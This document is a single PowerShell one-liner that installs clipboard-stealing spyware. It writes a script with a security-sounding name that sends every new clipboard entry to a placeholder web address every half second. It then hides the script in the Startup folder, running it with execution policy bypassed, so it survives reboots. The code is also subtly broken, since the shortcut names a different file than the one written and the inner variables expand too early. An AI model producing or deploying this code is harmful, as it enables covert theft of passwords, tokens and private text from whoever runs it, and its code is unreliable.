Set-Content "$env:USERPROFILE\WinSecService.ps1" "$url='https://your-url-here.com';$lastText='';while($true){$current=Get-Clipboard -TextFormatType Text -ErrorAction SilentlyContinue;if($null -ne $current -and $current -ne $lastText){$body=@{message=$current}|ConvertTo-Json;Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType 'application/json';$lastText=$current};Start-Sleep -Milliseconds 500}"; $wsh=New-Object -ComObject WScript.Shell;$s=$wsh.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinSecServices.lnk");$s.TargetPath="powershell.exe";$s.Arguments='-ExecutionPolicy Bypass -WindowStyle Hidden -File "$env:USERPROFILE\WinSecServices.ps1"';$s.Save()